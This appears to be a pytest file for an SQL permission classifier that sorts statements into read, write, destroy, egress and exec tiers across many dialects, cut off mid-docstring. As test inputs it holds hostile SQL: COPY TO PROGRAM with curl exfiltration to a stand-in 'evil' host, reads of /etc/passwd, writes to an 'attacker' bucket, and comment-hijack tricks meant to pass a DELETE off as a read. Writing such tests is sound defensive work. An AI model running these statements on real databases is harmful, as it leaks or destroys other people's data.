"""Exhaustive sqlglot-AST classifier tests.

The classifier is the load-bearing safety boundary, so every effect tier + the
asymmetric/negative cases get a named, separately-reported parametrization."""

from __future__ import annotations

import pytest
from alkera_cli.contracts.tool_types import Effect
from alkera_cli.plugins.plugin_base.permissions import (
    classify_statements,
    descriptor_from_sql,
    is_floor,
)


@pytest.mark.parametrize(
    ("sql", "effect", "confidence", "floor"),
    [
        pytest.param("SELECT 42 AS a", Effect.READ, "exact", False, id="select"),
        pytest.param(
            "SELECT * FROM t JOIN u ON t.id=u.id", Effect.READ, "exact", False, id="select-join"
        ),
        pytest.param(
            "WITH c AS (SELECT 1) SELECT * FROM c", Effect.READ, "exact", False, id="read-cte"
        ),
        pytest.param("EXPLAIN SELECT * FROM t", Effect.READ, "exact", False, id="explain"),
        pytest.param("INSERT INTO t VALUES (1)", Effect.WRITE, "exact", False, id="insert"),
        pytest.param("CREATE TABLE t (id INT)", Effect.WRITE, "exact", False, id="create"),
        pytest.param("ALTER TABLE t ADD COLUMN c INT", Effect.WRITE, "exact", False, id="alter"),
        pytest.param(
            "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET t.x=s.x",
            Effect.WRITE,
            "exact",
            False,
            id="merge",
        ),
        pytest.param(
            "UPDATE t SET x=1 WHERE id=1", Effect.WRITE, "exact", False, id="update-guarded"
        ),
        # DELETE is destroy regardless of WHERE — deletion is irreversible (mirrors
        # `rm` in the shell classifier). UPDATE stays a recoverable write when
        # guarded (it modifies in place; only an unguarded mass UPDATE escalates).
        pytest.param(
            "DELETE FROM t WHERE id=1", Effect.DESTROY, "exact", True, id="delete-guarded"
        ),
        # Asymmetric: missing WHERE escalates UPDATE to DESTROY (floor); DELETE is
        # already DESTROY.
        pytest.param("UPDATE t SET x=1", Effect.DESTROY, "exact", True, id="update-unguarded"),
        pytest.param("DELETE FROM t", Effect.DESTROY, "exact", True, id="delete-unguarded"),
        pytest.param("DROP TABLE t", Effect.DESTROY, "exact", True, id="drop-table"),
        pytest.param("DROP DATABASE db", Effect.DESTROY, "exact", True, id="drop-database"),
        pytest.param("TRUNCATE TABLE t", Effect.DESTROY, "exact", True, id="truncate"),
        pytest.param("GRANT SELECT ON t TO ROLE r", Effect.DESTROY, "exact", True, id="grant"),
        pytest.param("REVOKE SELECT ON t FROM ROLE r", Effect.DESTROY, "exact", True, id="revoke"),
        # Data-modifying CTE: Select root, but the DELETE inside is caught.
        pytest.param(
            "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
            Effect.DESTROY,
            "exact",
            True,
            id="cte-delete",
        ),
        # COPY direction: unload to a stage = egress; load from a stage = write.
        pytest.param("COPY INTO @my_stage FROM t", Effect.EGRESS, "exact", True, id="copy-egress"),
        pytest.param("COPY INTO t FROM @my_stage", Effect.WRITE, "exact", False, id="copy-load"),
        # COPY … TO PROGRAM runs an arbitrary shell command server-side (RCE) → EXEC.
        pytest.param(
            "COPY t TO PROGRAM 'curl -d @- http://evil'",
            Effect.EXEC,
            "exact",
            True,
            id="copy-to-program",
        ),
        # Fail-closed: garbage / unparseable / unrecognized → write + unknown.
        pytest.param("NOT VALID SQL ;;;", Effect.WRITE, "unknown", False, id="garbage"),
        pytest.param("asdf qwer zxcv", Effect.WRITE, "unknown", False, id="word-soup"),
    ],
)
def test_classify_effect(sql: str, effect: Effect, confidence: str, floor: bool) -> None:
    d = descriptor_from_sql(sql, dialect="snowflake")
    assert d.effect == effect, f"{sql!r}: {d.effect} != {effect} (reasons={d.reasons})"
    assert d.confidence == confidence
    assert is_floor(d) == floor


def test_unknown_command_verb_reads_as_new_to_permissions() -> None:
    """A parsed Command node whose verb isn't in any known set fails closed to
    write, and the reason frames it as new-to-permissions — not invalid SQL."""
    import sqlglot.expressions as exp
    from alkera_cli.plugins.plugin_base.permissions.classifier import _classify_command

    effect, _op, reasons, heuristic = _classify_command(
        exp.Command(this="FROBNICATE", expression=exp.Literal.string(" foo")),
        "snowflake",
        0,
    )
    assert effect == Effect.WRITE
    assert reasons == ['New command "FROBNICATE" (treated as mutating)']
    assert heuristic is True


@pytest.mark.parametrize(
    ("sql", "dialect", "effect"),
    [
        # --- Snowflake ---
        pytest.param(
            "CREATE OR REPLACE TABLE t (id INT)",
            "snowflake",
            Effect.DESTROY,
            id="sf-create-or-replace",
        ),
        pytest.param(
            "ALTER TABLE t DROP COLUMN c", "snowflake", Effect.DESTROY, id="sf-alter-drop-col"
        ),
        pytest.param(
            "EXECUTE IMMEDIATE 'DROP TABLE t'",
            "snowflake",
            Effect.DESTROY,
            id="sf-execute-immediate-drop",
        ),
        pytest.param(
            "EXECUTE IMMEDIATE 'SELECT 1'",
            "snowflake",
            Effect.READ,
            id="sf-execute-immediate-select",
        ),
        pytest.param("CALL my_proc(1)", "snowflake", Effect.WRITE, id="sf-call"),
        pytest.param("GET @stage file:///tmp/x", "snowflake", Effect.EGRESS, id="sf-get"),
        pytest.param("PUT file:///tmp/x @stage", "snowflake", Effect.EGRESS, id="sf-put"),
        pytest.param("REMOVE @stage/path", "snowflake", Effect.DESTROY, id="sf-remove"),
        pytest.param("UNDROP TABLE t", "snowflake", Effect.WRITE, id="sf-undrop"),
        pytest.param("SHOW TABLES", "snowflake", Effect.READ, id="sf-show"),
        pytest.param("DESCRIBE TABLE t", "snowflake", Effect.READ, id="sf-describe"),
        # --- Redshift ---
        pytest.param(
            "UNLOAD ('SELECT * FROM t') TO 's3://b/k'", "redshift", Effect.EGRESS, id="rs-unload"
        ),
        pytest.param("COPY t FROM 's3://b/k'", "redshift", Effect.WRITE, id="rs-copy-load"),
        pytest.param("VACUUM t", "redshift", Effect.WRITE, id="rs-vacuum"),
        # --- BigQuery ---
        pytest.param(
            "EXPORT DATA OPTIONS(uri='gs://b/*') AS SELECT * FROM t",
            "bigquery",
            Effect.EGRESS,
            id="bq-export",
        ),
        pytest.param("TRUNCATE TABLE t", "bigquery", Effect.DESTROY, id="bq-truncate"),
        pytest.param(
            "CREATE OR REPLACE TABLE t AS SELECT 1",
            "bigquery",
            Effect.DESTROY,
            id="bq-create-or-replace",
        ),
        # --- MySQL ---
        pytest.param("REPLACE INTO t VALUES (1)", "mysql", Effect.WRITE, id="my-replace-into"),
        pytest.param("LOAD DATA INFILE '/f' INTO TABLE t", "mysql", Effect.EXEC, id="my-load-data"),
        pytest.param("SELECT * INTO OUTFILE '/f' FROM t", "mysql", Effect.EXEC, id="my-outfile"),
        # --- Postgres ---
        pytest.param("COPY t TO '/tmp/f.csv'", "postgres", Effect.EXEC, id="pg-copy-to"),
        pytest.param("COPY t FROM '/tmp/f.csv'", "postgres", Effect.EXEC, id="pg-copy-from"),
        pytest.param("DROP TABLE IF EXISTS t", "postgres", Effect.DESTROY, id="pg-drop-if-exists"),
        pytest.param("SELECT lo_export(1, '/tmp/x')", "postgres", Effect.EXEC, id="pg-lo-export"),
        # --- T-SQL ---
        pytest.param("EXEC('DROP TABLE t')", "tsql", Effect.DESTROY, id="tsql-exec-drop"),
        pytest.param(
            "EXEC sp_executesql N'TRUNCATE TABLE t'",
            "tsql",
            Effect.DESTROY,
            id="tsql-sp-executesql",
        ),
        pytest.param("EXEC('SELECT 1')", "tsql", Effect.READ, id="tsql-exec-select"),
        pytest.param("SELECT * INTO newtbl FROM t", "tsql", Effect.WRITE, id="tsql-select-into"),
        # --- DuckDB / SQLite / ClickHouse ---
        pytest.param(
            "INSERT OR REPLACE INTO t VALUES (1)",
            "sqlite",
            Effect.WRITE,
            id="sqlite-insert-or-replace",
        ),
        pytest.param("ATTACH 'x.db' AS x", "duckdb", Effect.EXEC, id="duckdb-attach"),
        pytest.param(
            "ALTER TABLE t DELETE WHERE 1=1", "clickhouse", Effect.DESTROY, id="ch-alter-delete"
        ),
        pytest.param("OPTIMIZE TABLE t", "clickhouse", Effect.WRITE, id="ch-optimize"),
        # --- INSERT OVERWRITE (databricks/spark/hive/trino) ---
        # OVERWRITE TABLE atomically REPLACES existing rows (TRUNCATE+reload) → DESTROY floor,
        # NOT a plain recoverable WRITE. OVERWRITE DIRECTORY writes rows OUT to a path → EGRESS.
        pytest.param(
            "INSERT OVERWRITE TABLE warehouse.sales SELECT * FROM staging",
            "databricks",
            Effect.DESTROY,
            id="databricks-insert-overwrite-table",
        ),
        pytest.param(
            "INSERT OVERWRITE TABLE warehouse.sales SELECT * FROM staging",
            "trino",
            Effect.DESTROY,
            id="trino-insert-overwrite-table",
        ),
        pytest.param(
            "INSERT OVERWRITE TABLE t PARTITION (dt='2026-01-01') SELECT * FROM s",
            "hive",
            Effect.DESTROY,
            id="hive-insert-overwrite-partition",
        ),
        pytest.param(
            "INSERT OVERWRITE DIRECTORY 's3://attacker/exfil' SELECT * FROM warehouse.sensitive",
            "databricks",
            Effect.EGRESS,
            id="databricks-insert-overwrite-directory",
        ),
        pytest.param(
            "INSERT OVERWRITE LOCAL DIRECTORY '/tmp/out' SELECT * FROM t",
            "spark",
            Effect.EGRESS,
            id="spark-insert-overwrite-local-directory",
        ),
        # Asymmetric: a PLAIN insert on the same dialect must NOT escalate past WRITE.
        pytest.param(
            "INSERT INTO warehouse.sales SELECT * FROM staging",
            "databricks",
            Effect.WRITE,
            id="databricks-plain-insert-stays-write",
        ),
        # --- ANSI / generic destructive ---
        pytest.param("DELETE FROM t WHERE 1=1", "", Effect.DESTROY, id="ansi-delete-tautology"),
        pytest.param(
            "UPDATE t SET x=1 WHERE TRUE", "", Effect.DESTROY, id="ansi-update-tautology-true"
        ),
        pytest.param(
            "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN DELETE",
            "",
            Effect.WRITE,
            id="ansi-merge-delete-clause",
        ),
    ],
)
def test_classify_cross_dialect(sql: str, dialect: str, effect: Effect) -> None:
    """Mutating/destructive/egress commands across the top SQL dialects all land
    on the right effect tier — the killer-feature regression net."""
    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect == effect, f"[{dialect}] {sql!r}: {d.effect} != {effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    ("sql", "effect"),
    [
        # State-SETTING PRAGMAs mutate engine/session state → WRITE (a READ would let them
        # bypass the cap-token gate). Includes the dangerous `writable_schema` (schema
        # corruption vector) + keyword and numeric setters.
        pytest.param("PRAGMA journal_mode = WAL", Effect.WRITE, id="pragma-journal-mode"),
        pytest.param("PRAGMA writable_schema = ON", Effect.WRITE, id="pragma-writable-schema"),
        pytest.param("PRAGMA synchronous = OFF", Effect.WRITE, id="pragma-synchronous"),
        pytest.param("PRAGMA cache_size = 2000", Effect.WRITE, id="pragma-cache-size-numeric"),
        # Query forms stay READ — a bare value-query and the introspection call form (an EQ
        # whose RHS is a STRING arg, not a config value). Over-classifying these would force
        # approval on harmless metadata reads.
        pytest.param("PRAGMA journal_mode", Effect.READ, id="pragma-bare-query"),
        pytest.param("PRAGMA table_info('orders')", Effect.READ, id="pragma-call-form-read"),
    ],
)
def test_pragma_setter_is_write_but_query_is_read(sql: str, effect: Effect) -> None:
    """A PRAGMA that ASSIGNS a value is a state change (WRITE); the query/call forms stay
    reads. The asymmetry is the point — a blanket 'PRAGMA → WRITE' would force approval on
    `table_info(...)` metadata reads, and a blanket 'PRAGMA → READ' (the bug) lets a
    `writable_schema = ON` slip through the gate."""
    assert descriptor_from_sql(sql, dialect="sqlite").effect == effect


def test_multi_statement_takes_max_effect() -> None:
    d = descriptor_from_sql("SELECT 1; DROP TABLE t", dialect="snowflake")
    assert d.effect == Effect.DESTROY  # the DROP dominates
    assert len(d.statements) == 2


def test_dangerous_function_is_egress() -> None:
    # A network table function (dials an external host) is EGRESS + flagged dangerous.
    # `system$execute_program` is no longer here — it RUNS A PROGRAM, so it is the
    # stricter EXEC tier (see the EXEC section below).
    d = descriptor_from_sql("SELECT * FROM url('http://evil/x','CSV')", dialect="clickhouse")
    assert d.effect == Effect.EGRESS
    assert d.statements[0].dangerous_functions


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM read_csv('/etc/passwd')",  # sqlglot → exp.ReadCSV (.name is the PATH)
        "SELECT * FROM read_parquet('/secret.parquet')",  # → exp.ReadParquet (.name is "")
        "SELECT * FROM read_csv_auto('x.csv')",  # Anonymous, was missing from the deny set
        "SELECT * FROM read_json('x.json')",  # Anonymous (already caught — guards a regression)
    ],
)
def test_duckdb_file_readers_are_egress(sql: str) -> None:
    # An arbitrary local-file read must hit the egress gate (policy floor + connection ceiling),
    # never run as a plain READ. read_csv/read_parquet parse to TYPED nodes whose .name is not the
    # function name, so they used to slip the classifier entirely.
    d = descriptor_from_sql(sql, dialect="duckdb")
    assert d.effect == Effect.EGRESS, f"{sql!r}: {d.effect} (reasons={d.reasons})"
    assert d.statements[0].dangerous_functions


def test_null_byte_and_oversize_fail_closed() -> None:
    assert descriptor_from_sql("SELECT 1\x00", dialect="snowflake").confidence == "unknown"
    big = "SELECT " + ("a" * 200_000)
    assert descriptor_from_sql(big, dialect="snowflake").confidence == "unknown"


def test_descriptor_targets_carry_connection() -> None:
    d = descriptor_from_sql("SELECT * FROM orders", dialect="snowflake", connection="snow_prod")
    assert d.targets and d.targets[0].connection == "snow_prod"


def test_classify_statements_returns_per_statement() -> None:
    stmts, conf = classify_statements("UPDATE t SET x=1", dialect="snowflake")
    assert conf == "exact"
    assert stmts[0].effect == Effect.DESTROY
    assert stmts[0].has_where is False


@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM t WHERE id=2",
        "INSERT INTO t VALUES (1)",
        "UPDATE t SET x=1 WHERE id=1",
        "SELECT * FROM t",
    ],
)
def test_unknown_dialect_name_degrades_to_neutral_not_unknown(sql: str) -> None:
    # A stale / differently-spelled dialect NAME — sqlglot spells SQL Server "tsql", not
    # "sqlserver" — must NOT make the parse raise and drop the classification to operation
    # "unknown". That desyncs the GATE's descriptor (built from conn.dialect) from the connector's
    # own neutral-dialect descriptor → the cap-token fingerprint never matches → an approved write
    # is permanently refused. An unknown dialect degrades to the neutral parser, matching the
    # connector, so the fingerprints line up.
    neutral = descriptor_from_sql(sql, dialect="")
    bogus = descriptor_from_sql(sql, dialect="sqlserver")
    assert bogus.operation == neutral.operation != "unknown"
    assert bogus.effect == neutral.effect
    assert bogus.fingerprint() == neutral.fingerprint()  # cap-token authorizes the approved write


def test_unknown_dialect_still_fails_closed_on_garbage_sql() -> None:
    # The degrade-to-neutral path must NOT weaken the fail-closed guarantee: genuinely
    # unparseable SQL is still WRITE + unknown, even with an unknown dialect name.
    stmts, conf = classify_statements("this is not valid sql ;;;", dialect="sqlserver")
    assert conf == "unknown"
    assert stmts[0].effect == Effect.WRITE


@pytest.mark.parametrize(
    ("sql", "effect"),
    [
        # A DROP/TRUNCATE/GRANT hidden in an anonymous DO block must escalate to its body's effect
        # (DESTROY), not rest at WRITE where it would slip past the human destroy-floor.
        pytest.param("DO $$ BEGIN DROP TABLE important; END $$", Effect.DESTROY, id="do-drop"),
        pytest.param(
            "DO $body$ BEGIN DROP TABLE important; END $body$",
            Effect.DESTROY,
            id="do-drop-named-tag",
        ),
        pytest.param("DO $$ BEGIN TRUNCATE t; END $$", Effect.DESTROY, id="do-truncate"),
        pytest.param("DO $$ BEGIN GRANT ALL ON t TO bob; END $$", Effect.DESTROY, id="do-grant"),
        # A benign DO body is NOT over-escalated.
        pytest.param("DO $$ BEGIN INSERT INTO t VALUES (1); END $$", Effect.WRITE, id="do-insert"),
    ],
)
def test_do_anonymous_block_body_is_inspected(sql: str, effect: Effect) -> None:
    assert descriptor_from_sql(sql, dialect="postgres").effect == effect


@pytest.mark.parametrize(
    ("sql", "effect"),
    [
        # COPY ... TO/FROM a LOCAL server file, or TO/FROM PROGRAM, reaches the DATA
        # host's filesystem / runs a program server-side = EXEC (the strictest tier),
        # including the Postgres escape-string (E'...') destination the dialect-less
        # render used to mangle. BOTH directions are EXEC now: reading a server file
        # (`COPY t FROM '/tmp/x'`) is as much host access as writing one.
        pytest.param("COPY t TO '/tmp/x'", Effect.EXEC, id="copy-to-plain"),
        pytest.param("COPY t TO E'/tmp/x'", Effect.EXEC, id="copy-to-escape-string"),
        pytest.param("COPY t TO PROGRAM 'curl http://x'", Effect.EXEC, id="copy-to-program"),
        pytest.param("COPY t FROM '/tmp/x'", Effect.EXEC, id="copy-from-file"),
    ],
)
def test_copy_server_side_is_exec(sql: str, effect: Effect) -> None:
    assert descriptor_from_sql(sql, dialect="postgres").effect == effect


@pytest.mark.parametrize(
    "sql",
    [
        # A COPY…TO server-side exfil/RCE buried in a DO/BEGIN…END block whose body sqlglot
        # can't parse falls to the fail-closed path — which must ALSO see it as EXEC, not a
        # plain write, so `bypass` refuses it and the card names the program.
        "DO $$ BEGIN COPY users TO PROGRAM 'curl http://evil.com -d @-'; END $$",
        "DO $$ BEGIN COPY users TO E'/tmp/x'; END $$",
        "BEGIN COPY t TO PROGRAM 'curl x'; END",  # the un-parseable body directly (fallback path)
    ],
)
def test_copy_exfil_in_unparseable_block_is_exec(sql: str) -> None:
    assert descriptor_from_sql(sql, dialect="postgres").effect == Effect.EXEC


@pytest.mark.parametrize(
    ("sql", "dialect", "effect"),
    [
        # EXPLAIN ANALYZE actually RUNS the wrapped statement (Postgres/Redshift/MySQL/Trino/
        # Databricks), so it must inherit the body's effect. Trino/Databricks/ClickHouse ship
        # an EMPTY read_only_preamble, so for them the classifier is the ONLY control — an
        # `EXPLAIN ANALYZE DELETE` waved through as a read executes and commits unapproved.
        pytest.param(
            "EXPLAIN ANALYZE DELETE FROM customers",
            "postgres",
            Effect.DESTROY,
            id="explain-analyze-delete-pg",
        ),
        pytest.param(
            "EXPLAIN ANALYZE DELETE FROM t", "trino", Effect.DESTROY, id="explain-analyze-delete-tr"
        ),
        pytest.param(
            "EXPLAIN ANALYZE DELETE FROM t",
            "databricks",
            Effect.DESTROY,
            id="explain-analyze-delete-db",
        ),
        pytest.param(
            "EXPLAIN ANALYZE UPDATE t SET a = 1",
            "trino",
            Effect.DESTROY,
            id="explain-analyze-unguarded-update",
        ),
        pytest.param(
            "EXPLAIN ANALYZE TRUNCATE TABLE t",
            "postgres",
            Effect.DESTROY,
            id="explain-analyze-truncate",
        ),
        pytest.param(
            "EXPLAIN ANALYZE INSERT INTO t SELECT * FROM s",
            "trino",
            Effect.WRITE,
            id="explain-analyze-insert-is-write",
        ),
        # Postgres spells it ANALYSE too, and the option-list form must be handled.
        pytest.param(
            "EXPLAIN ANALYZE SELECT pg_read_file('/etc/passwd')",
            "postgres",
            Effect.EXEC,
            id="explain-analyze-pg-read-file",
        ),
        pytest.param(
            "EXPLAIN (ANALYZE, BUFFERS) SELECT pg_read_file('/etc/passwd')",
            "postgres",
            Effect.EXEC,
            id="explain-paren-options-pg-read-file",
        ),
        pytest.param(
            "EXPLAIN ANALYSE SELECT lo_export(16384, '/tmp/pwn')",
            "postgres",
            Effect.EXEC,
            id="explain-analyse-british-lo-export",
        ),
        pytest.param(
            "EXPLAIN ANALYZE SELECT * FROM url('http://evil/x','CSV')",
            "clickhouse",
            Effect.EGRESS,
            id="explain-analyze-ch-url",
        ),
        # A COMMENT between the verb and the body must not hijack the split: the body
        # keyword is located on a comment-blanked copy, so a `/* SELECT */` (or a `--`
        # line comment) can't make the wrapped DELETE re-classify as a plain read.
        pytest.param(
            "EXPLAIN ANALYZE /* SELECT */ DELETE FROM prod.customers",
            "postgres",
            Effect.DESTROY,
            id="explain-analyze-block-comment-hijack-pg",
        ),
        pytest.param(
            "EXPLAIN ANALYZE /* SELECT */ DELETE FROM prod.customers",
            "trino",
            Effect.DESTROY,
            id="explain-analyze-block-comment-hijack-tr",
        ),
        pytest.param(
            "EXPLAIN ANALYZE -- select\nDELETE FROM prod.customers",
            "postgres",
            Effect.DESTROY,
            id="explain-analyze-line-comment-hijack-pg",
        ),
        pytest.param(
            "EXPLAIN ANALYZE -- select\nDELETE FROM prod.customers",
            "trino",
            Effect.DESTROY,
            id="explain-analyze-line-comment-hijack-tr",
        ),
        pytest.param(
            "EXPLAIN ANALYZE /* x */ SELECT pg_read_file('/etc/passwd')",
            "postgres",
            Effect.EXEC,
            id="explain-analyze-comment-then-dangerous-func",
        ),
        # A comment INSIDE the body still reaches the inner classifier (the blanked copy
        # only LOCATES the split; the slice comes from the original text).
        pytest.param(
            "EXPLAIN ANALYZE DELETE /* all of them */ FROM t",
            "postgres",
            Effect.DESTROY,
            id="explain-analyze-comment-inside-body",
        ),
        # MySQL spells its option as FORMAT=TREE — an `=` is still a valid option list.
        pytest.param(
            "EXPLAIN ANALYZE FORMAT=TREE DELETE FROM t",
            "trino",
            Effect.DESTROY,
            id="explain-analyze-format-option-then-dml",
        ),
        # Asymmetric: EXPLAIN WITHOUT analyze only plans — it stays a read even over a DML,
        # and a benign ANALYZE'd SELECT must not be over-escalated.
        pytest.param("EXPLAIN SELECT * FROM t", "postgres", Effect.READ, id="explain-plain-select"),
        pytest.param("EXPLAIN DELETE FROM t", "postgres", Effect.READ, id="explain-plain-delete"),
        pytest.param(
            "EXPLAIN ANALYZE SELECT 1", "postgres", Effect.READ, id="explain-analyze-select-stays"
        ),
        # …and a COMMENTED-OUT analyze is not an analyze, so this stays a plan dump.
        pytest.param(
            "EXPLAIN /* ANALYZE */ SELECT 1",
            "postgres",
            Effect.READ,
            id="explain-commented-out-analyze-stays-read",
        ),
        # A `--` inside a STRING LITERAL is data, not a comment — the body is still the
        # SELECT, so the benign read must not be over-escalated to a write.
        pytest.param(
            "EXPLAIN ANALYZE SELECT '-- DELETE FROM t' AS s",
            "trino",
            Effect.READ,
            id="explain-analyze-comment-marker-in-string-stays-read",
        ),
        # An ANALYZE form whose body can't be isolated must never rest at READ.
        pytest.param("EXPLAIN ANALYZE", "postgres", Effect.WRITE, id="explain-analyze-no-body"),
        # Nothing but option tokens may precede the body — that is the SECOND layer, and
        # it stands on its own: here the junk between the verb and the body is not a
        # comment (so blanking doesn't help) yet the remainder still parses as a plain
        # Select, which is exactly how the comment payload used to rest at READ.
        pytest.param(
            "EXPLAIN ANALYZE *SELECT* DELETE FROM prod.customers",
            "trino",
            Effect.WRITE,
            id="explain-analyze-junk-before-body-fails-closed",
        ),
        pytest.param(
            "EXPLAIN ANALYZE 'SELECT' SELECT 1",
            "postgres",
            Effect.WRITE,
            id="explain-analyze-quoted-options-fail-closed",
        ),
        # dblink_exec runs SQL on ANOTHER server: the local read-only transaction and the
        # forced rollback don't reach it, so it takes the DESTROY floor (a human) rather than
        # the EGRESS tier that auto mode hands to the judge.
        pytest.param(
            "SELECT dblink_exec('dbname=prod', 'DROP TABLE customers')",
            "postgres",
            Effect.DESTROY,
            id="dblink-exec-remote-mutation",
        ),
        pytest.param(
            "SELECT dblink_send_query('dbname=prod', 'DROP TABLE customers')",
            "postgres",
            Effect.DESTROY,
            id="dblink-send-query-remote",
        ),
        # The read-shaped dblink entry points stay on the EGRESS gate (asymmetry guard).
        pytest.param(
            "SELECT * FROM dblink('h', 'SELECT 1') AS t(a int)",
            "postgres",
            Effect.EGRESS,
            id="dblink-read-is-egress",
        ),
        pytest.param(
            "SELECT dblink_open('c', 'SELECT 1')",
            "postgres",
            Effect.EGRESS,
            id="dblink-open-is-egress",
        ),
        # Server-side file readers that were missing from the deny set.
        pytest.param(
            "SELECT pg_read_binary_file('/etc/passwd')",
            "postgres",
            Effect.EXEC,
            id="pg-read-binary-file",
        ),
        pytest.param("SELECT pg_ls_waldir()", "postgres", Effect.EXEC, id="pg-ls-waldir"),
        pytest.param(
            "SELECT pg_read_binary_file('/etc/passwd')",
            "redshift",
            Effect.EXEC,
            id="rs-pg-read-binary-file",
        ),
        # A multi-action ALTER that includes a DROP falls back to exp.Command (typed Alter parse
        # fails for mixed actions); the destructive sub-action must still escalate to DESTROY, not
        # auto-allow irreversible column loss as a plain write.
        pytest.param(
            "ALTER TABLE t ADD COLUMN x int, DROP COLUMN y",
            "postgres",
            Effect.DESTROY,
            id="alter-multi-drop-column",
        ),
        pytest.param(
            "ALTER TABLE t DROP CONSTRAINT c, ADD COLUMN x int",
            "postgres",
            Effect.DESTROY,
            id="alter-multi-drop-constraint",
        ),
        # A multi-action ALTER with NO destructive sub-action stays a plain write (not escalated).
        pytest.param(
            "ALTER TABLE t ADD COLUMN x int, ADD COLUMN z int",
            "postgres",
            Effect.WRITE,
            id="alter-multi-add-only",
        ),
        # Snowflake GET with a QUOTED local dest parses to a typed exp.Get (not Command(GET)); it
        # downloads staged data to the client filesystem = egress.
        pytest.param("GET @stage 'file:///tmp/x'", "snowflake", Effect.EGRESS, id="get-quoted"),
        pytest.param("GET @stage file:///tmp/x", "snowflake", Effect.EGRESS, id="get-unquoted"),
        # PUT (local→stage upload) is a write, not egress (asymmetry guard).
        pytest.param("PUT 'file:///tmp/x' @stage", "snowflake", Effect.EGRESS, id="put-quoted"),
    ],
)
def test_command_fallback_and_typed_get_classify_correctly(
    sql: str, dialect: str, effect: Effect
) -> None:
    assert descriptor_from_sql(sql, dialect=dialect).effect == effect


@pytest.mark.parametrize(
    ("sql", "dialect"),
    [
        pytest.param("EXPLAIN ANALYZE DELETE FROM prod.customers", "trino", id="explain-delete"),
        pytest.param("EXPLAIN ANALYZE TRUNCATE TABLE t", "postgres", id="explain-truncate"),
        # …and the comment-wrapped variants of the same exploit, which slipped the first
        # fix by hijacking the body split with a keyword inside a comment.
        pytest.param(
            "EXPLAIN ANALYZE /* SELECT */ DELETE FROM prod.customers",
            "trino",
            id="explain-block-comment-delete",
        ),
        pytest.param(
            "EXPLAIN ANALYZE -- select\nDELETE FROM prod.customers",
            "postgres",
            id="explain-line-comment-delete",
        ),
        pytest.param(
            "SELECT dblink_exec('dbname=prod', 'DROP TABLE customers')",
            "postgres",
            id="dblink-exec",
        ),
    ],
)
def test_remote_and_wrapped_mutations_never_take_the_read_fast_path(sql: str, dialect: str) -> None:
    """The security property, stated at the gate rather than the classifier: these all
    used to return ``effect=read``, and a READ descriptor short-circuits the whole gate
    (no broker prompt, no cap-token) and auto-allows in EVERY mode. They must now bind
    the human floor."""
    from alkera_cli.plugins.plugin_base.permissions import AutoDecision, decide

    d = descriptor_from_sql(sql, dialect=dialect)
    assert d.effect != Effect.READ
    assert is_floor(d)
    for mode in ("default", "auto", "read_only", "plan"):
        assert decide(d, mode=mode) >= AutoDecision.PROMPT, f"auto-allowed in {mode}"


# --------------------------------------------------------------------------- #
# Read-only hardening: transaction control, mode-changing
# SET, side-effecting functions, and the ClickHouse remote/storage table functions
# are never a plain read. Each is paired with a NEGATIVE case so a benign sibling
# still reads.
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SET TRANSACTION READ WRITE", id="set-transaction-read-write"),
        pytest.param("SET transaction_read_only = off", id="set-guc-off"),
        pytest.param("SET default_transaction_read_only = off", id="set-default-guc-off"),
        pytest.param(
            "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE", id="set-session-char"
        ),
        pytest.param("SET ROLE admin", id="set-role"),
        pytest.param("SET SESSION AUTHORIZATION postgres", id="set-session-authorization"),
        pytest.param("COMMIT", id="commit"),
        pytest.param("COMMIT WORK", id="commit-work"),
        pytest.param("ROLLBACK", id="rollback"),
        pytest.param("END", id="end-is-commit"),
        pytest.param("BEGIN", id="begin"),
        pytest.param("ROLLBACK TO SAVEPOINT s", id="rollback-to-savepoint"),
    ],
)
def test_transaction_control_and_mode_set_are_never_a_read(sql: str) -> None:
    """Transaction control and a transaction-mode / authorization / role SET dismantle
    the read-only transaction (COMMIT ends it; SET READ WRITE re-opens it) — so they
    are WRITEs that need a cap token, never the READ default they used to rest at."""
    d = descriptor_from_sql(sql, dialect="postgres")
    assert d.effect != Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SET statement_timeout = 1000", id="statement-timeout"),
        pytest.param("SET LOCAL statement_timeout = 1000", id="local-statement-timeout"),
        pytest.param("SET search_path = public", id="search-path"),
        pytest.param("SET TIME ZONE 'UTC'", id="time-zone"),
    ],
)
def test_a_benign_session_guc_stays_a_read(sql: str) -> None:
    """The asymmetric half: a plain session GUC (the connector's own preamble uses
    ``SET statement_timeout``) must NOT be swept up as a write."""
    d = descriptor_from_sql(sql, dialect="postgres")
    assert d.effect == Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT pg_terminate_backend(1234)", id="terminate-backend"),
        pytest.param("SELECT pg_cancel_backend(1234)", id="cancel-backend"),
        pytest.param("SELECT pg_reload_conf()", id="reload-conf"),
        pytest.param("SELECT pg_advisory_lock(1)", id="advisory-lock"),
        pytest.param("SELECT set_config('x', 'y', false)", id="set-config"),
        pytest.param("SELECT pg_stat_reset()", id="stat-reset"),
        pytest.param("SELECT pg_switch_wal()", id="switch-wal"),
        pytest.param("SELECT pg_notify('c', 'p')", id="notify"),
    ],
)
def test_side_effecting_postgres_functions_are_write(sql: str) -> None:
    """A local side-effecting admin function is legal inside a read-only transaction
    and commits nothing, so the transaction preamble and the rollback never see it —
    only the classifier can floor it to WRITE so a read-only session refuses it."""
    d = descriptor_from_sql(sql, dialect="postgres")
    assert d.effect != Effect.READ, f"{sql!r}: {d.effect} (reasons={d.reasons})"


@pytest.mark.parametrize(
    "sql",
    [
        pytest.param("SELECT setval('s', 99)", id="setval"),
        pytest.param("SELECT now()", id="now"),
        pytest.param("SELECT count(*) FROM orders", id="count"),
        pytest.param("SELECT pg_backend_pid()", id="backend-pid"),
    ],
)
def test_a_plain_or_txn_blocked_function_read_stays_a_read(sql: str) -> None:
    """The asymmetric half: ordinary functions (and ``setval``, which the read-only
    transaction itself blocks) must stay READ — the side-effect set is a targeted
